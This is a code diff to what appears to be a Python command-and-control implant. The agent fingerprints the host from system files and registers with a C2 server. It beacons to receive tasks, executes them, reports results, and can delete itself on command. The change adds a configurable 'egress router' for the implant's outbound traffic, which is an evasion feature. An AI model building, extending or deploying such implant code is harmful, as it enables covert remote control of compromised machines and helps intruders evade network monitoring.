@@ -4,13 +4,20 @@ import httpx
 
 C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
 INTERVAL = 30
+EGRESS_STRATEGY = os.getenv("EGRESS_STRATEGY", "auto")
+
+try:
+    from orchestrator.egress.router import EgressRouter
+    _router = EgressRouter(strategy=EGRESS_STRATEGY)
+except ImportError:
+    _router = None
 
 async def get_hwid() -> str:
     data = ""
     for path in ["/etc/machine-id", "/etc/hostname"]:
         try:
             data += open(path).read().strip()
-        except:
+        except Exception:
             pass
     data += hex(uuid.getnode())
     return hashlib.sha256(data.encode()).hexdigest()[:16]
@@ -18,7 +25,7 @@ async def get_hwid() -> str:
 async def register() -> tuple[str, bytes]:
     hwid = await get_hwid()
     pk, sk = generate_keypair()
-    async with httpx.AsyncClient() as client:
+    async with (_router.get_client() if _router else httpx.AsyncClient()) as client:
         resp = await client.post(f"{C2_URL}/v1/agent/register", json={
             "hwid": hwid,
             "pubkey": base64.b64encode(pk).decode(),
@@ -31,7 +38,7 @@ async def register() -> tuple[str, bytes]:
 
 async def heartbeat(agent_id: str, session_key: bytes) -> list[dict]:
     payload = base64.b64encode(json.dumps({"agent_id": agent_id, "status": "idle", "ts": time.time()}).encode()).decode()
-    async with httpx.AsyncClient() as client:
+    async with (_router.get_client() if _router else httpx.AsyncClient()) as client:
         resp = await client.post(f"{C2_URL}/v1/agent/beat", json={"data": payload})
         if resp.status_code == 200:
             data = resp.json()
@@ -65,13 +72,13 @@ async def execute_task(task: dict) -> dict:
         import shutil
         try:
             shutil.rmtree(os.path.dirname(os.path.abspath(__file__)), ignore_errors=True)
-        except:
+        except Exception:
             pass
         os._exit(0)
     return {"error": f"unknown task type: {ttype}"}
 
 async def submit_result(agent_id: str, session_key: bytes, task_id: str, result: dict):
-    async with httpx.AsyncClient() as client:
+    async with (_router.get_client() if _router else httpx.AsyncClient()) as client:
         await client.post(f"{C2_URL}/v1/agent/result", json={
             "agent_id": agent_id, "task_id": task_id, "result": result,
         })
